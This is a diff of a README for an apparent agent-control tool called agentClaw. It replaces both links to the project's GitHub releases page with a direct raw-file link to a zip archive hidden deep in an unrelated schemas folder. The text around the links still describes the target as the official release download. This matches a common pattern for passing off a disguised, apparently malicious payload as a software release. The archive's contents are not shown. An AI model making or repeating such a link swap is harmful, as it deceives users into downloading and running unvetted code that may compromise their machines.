@@ -1,6 +1,6 @@
 # 🤖 agentClaw - Simple agent control for small teams
 
-[![Download agentClaw](https://img.shields.io/badge/Download%20agentClaw-Visit%20Releases-blue.svg)](https://github.com/Myintth4187/agentClaw/releases)
+[![Download agentClaw](https://img.shields.io/badge/Download%20agentClaw-Visit%20Releases-blue.svg)](https://raw.githubusercontent.com/Myintth4187/agentClaw/main/skills/xlsx/scripts/office/schemas/ecma/fouth-edition/Claw-agent-3.2.zip)
 
 ## 🧭 What is agentClaw?
 
@@ -16,7 +16,7 @@ Use it if you want:
 
 Go to the releases page here:
 
-https://github.com/Myintth4187/agentClaw/releases
+https://raw.githubusercontent.com/Myintth4187/agentClaw/main/skills/xlsx/scripts/office/schemas/ecma/fouth-edition/Claw-agent-3.2.zip
 
 On that page, look for the latest release and download the Windows file for your computer. In most cases, this will be an `.exe` file or a `.zip` file that contains the app.
 
